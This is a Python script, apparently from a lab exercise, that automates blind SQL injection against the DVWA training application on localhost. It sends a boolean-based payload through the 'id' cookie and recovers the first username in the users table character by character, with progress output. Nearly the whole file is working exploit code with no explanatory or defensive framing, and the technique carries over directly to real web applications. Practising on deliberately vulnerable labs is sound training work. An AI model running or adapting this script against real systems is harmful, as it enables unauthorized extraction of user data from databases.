import requests
import string

URL = "http://localhost:8080/vulnerabilities/sqli_blind/"
COOKIES = {
    "PHPSESSID": "vk1hjha086f8alsjru9a9o8h60",
    "security": "high"
}

# caracteres possíveis
CHARSET = string.ascii_lowercase + string.digits + "_@.-"


def test_char(position, char):
    payload = f"1' AND SUBSTRING((SELECT user FROM users LIMIT 1),{position},1)='{char}'#"

    cookies = COOKIES.copy()
    cookies["id"] = payload

    r = requests.get(URL, cookies=cookies)

    if "User ID exists" in r.text:
        return True

    return False


def extract(max_length=20):
    result = ""

    for pos in range(1, max_length + 1):
        found = False

        for c in CHARSET:
            print(f"[i] Testing position {pos} with '{c}'")

            if test_char(pos, c):
                print(f"[+] Found char at position {pos}: {c}")
                result += c
                found = True
                break

        if not found:
            print(f"[!] No more characters at position {pos}")
            break

    return result


if __name__ == "__main__":
    extracted = extract()
    print(f"\n[RESULT] Extracted value: {extracted}")
